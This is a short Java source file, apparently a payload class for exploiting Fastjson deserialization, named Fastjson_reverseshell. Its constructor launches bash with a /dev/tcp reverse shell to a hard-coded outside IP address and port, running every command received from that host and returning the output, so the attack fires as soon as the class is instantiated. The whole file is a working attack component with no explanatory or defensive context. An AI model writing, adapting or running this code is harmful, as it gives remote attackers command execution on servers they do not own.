import java.io.BufferedReader;
import java.io.InputStream;
import java.io.InputStreamReader;

public class Fastjson_reverseshell {
    public Fastjson_reverseshell() throws Exception {
        Process p = Runtime.getRuntime().exec(new String[] { "/bin/bash", "-c",
                "exec 5<>/dev/tcp/103.80.27.165/1234;cat <&5 | while read line; do $line 2>&5 >&5; done" });
        InputStream is = p.getInputStream();
        BufferedReader reader = new BufferedReader(new InputStreamReader(is));
        String line;
        while ((line = reader.readLine()) != null) {
            System.out.println(line);
        }
        p.waitFor();
        is.close();
        reader.close();
        p.destroy();
    }

    public static void main(String[] args) throws Exception {
    }
}